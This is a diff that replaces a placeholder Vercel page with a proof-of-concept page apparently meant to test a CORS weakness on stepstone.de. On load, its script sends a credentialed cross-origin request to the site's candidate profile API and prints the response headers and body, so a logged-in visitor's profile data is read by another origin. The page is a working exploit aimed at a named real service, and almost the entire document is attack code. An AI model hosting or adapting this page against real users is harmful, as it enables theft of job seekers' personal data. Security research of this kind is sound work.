@@ -1,11 +1,40 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Hello Vercel</title>
-</head>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"/><title>StepStone CORS PoC (fetch)</title></head>
 <body>
-  <h1>Hello, Vercel!</h1>
-  <p>Hosted via GitHub → Vercel</p>
+  <h3>PoC — run while logged into stepstone.de</h3>
+  <pre id="out"></pre>
+<script>
+const out = msg => document.getElementById('out').textContent += msg + '\n';
+
+async function run(){
+  const target = 'https://www.stepstone.de/candidate/profile/editor/api/v1/profile';
+  out('Origin of page: ' + location.origin);
+  try {
+    const resp = await fetch(target, {
+      method: 'GET',
+      credentials: 'include'    // instructs browser to include cookies if allowed by cookie policy
+    });
+
+    out('HTTP status: ' + resp.status + ' ' + resp.statusText);
+    out('Access-Control-Allow-Origin: ' + resp.headers.get('access-control-allow-origin'));
+    out('Access-Control-Allow-Credentials: ' + resp.headers.get('access-control-allow-credentials'));
+    out('Content-Type: ' + resp.headers.get('content-type'));
+
+    // clone so we can try parse safely
+    const clone = resp.clone();
+    let text = await clone.text();
+    try { 
+      const json = JSON.parse(text);
+      out('Body (json):\n' + JSON.stringify(json, null, 2).slice(0, 2000));
+    } catch(e) {
+      out('Body (raw):\n' + text.slice(0, 2000));
+    }
+  } catch (err) {
+    out('Fetch error: ' + err);
+  }
+}
+run();
+</script>
 </body>
 </html>
